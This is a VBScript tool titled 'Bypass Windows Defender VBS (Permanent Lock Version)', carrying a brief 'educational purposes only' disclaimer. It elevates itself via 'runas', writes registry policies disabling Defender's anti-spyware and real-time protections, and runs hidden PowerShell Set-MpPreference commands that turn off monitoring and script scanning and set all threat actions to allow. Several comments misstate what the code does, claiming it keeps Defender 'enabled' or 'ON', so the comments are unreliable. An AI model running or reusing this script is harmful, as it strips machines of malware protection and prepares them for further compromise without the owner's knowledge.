'       / Author     : NYAN CAT (Modified by Jan)
'       / Name       : Bypass Windows Defender VBS (Permanent Lock Version)
'       / Contact    : https://github.com/NYAN-x-CAT

'       This program is distributed for educational purposes only.

' Based on https://github.com/NYAN-x-CAT/Disable-Windows-Defender

If Not WScript.Arguments.Named.Exists("elevate") Then
  CreateObject("Shell.Application").ShellExecute WScript.FullName _
    , """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
  WScript.Quit
End If

On Error Resume Next
Set WshShell = CreateObject("WScript.Shell")

' --- PHASE 1: INITIAL LOCK DOWN (Goal 1 - Make it Impossible to Turn On) ---
' We write these keys with value "1" (Enabled/Active Policy), overriding any default settings.
WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware", "1", "REG_DWORD"
WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring", "1", "REG_DWORD" ' First instance
WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableOnAccessProtection", "1", "REG_DWORD"
WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableScanOnRealtimeEnable", "1", "REG_DWORD"
WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRawWriteNotification", "1", "REG_DWORD"
WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableIOAVProtection", "1", "REG_DWORD"
WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring", "1", "REG_DWORD" ' Second instance (redundancy/safety)

WScript.Sleep 100

' --- PHASE 2: PERSISTENT RE-ENFORCEMENT (Goal 2 - Disable Every Time It's Turned On) ---
' By using Set-MpPreference with $true, we are constantly telling Defender: "You MUST be enabled."
outputMessage("Set-MpPreference -DisableRealtimeMonitoring $true")
outputMessage("Set-MpPreference -DisableBehaviorMonitoring $true")
outputMessage("Set-MpPreference -DisableBlockAtFirstSeen $true")
outputMessage("Set-MpPreference -DisableIOAVProtection $true")
outputMessage("Set-MpPreference -DisableScriptScanning $true")

' Resetting other preferences to ensure they are locked in the "ON" state:
outputMessage("Set-MpPreference -SubmitSamplesConsent 2") ' Set to Accept All (On)
outputMessage("Set-MpPreference -MAPSReporting 0")       ' Keep reporting off, but policy is enforced
outputMessage("Set-MpPreference -HighThreatDefaultAction 6 -Force")
outputMessage("Set-MpPreference -ModerateThreatDefaultAction 6")
outputMessage("Set-MpPreference -LowThreatDefaultAction 6")
outputMessage("Set-MpPreference -SevereThreatDefaultAction 6")


Sub outputMessage(byval args)
On Error Resume Next
Set objShell = CreateObject("Wscript.shell")
' Running PowerShell with the command arguments, hiding the window (0)
objShell.run("powershell " + args), 0
End Sub
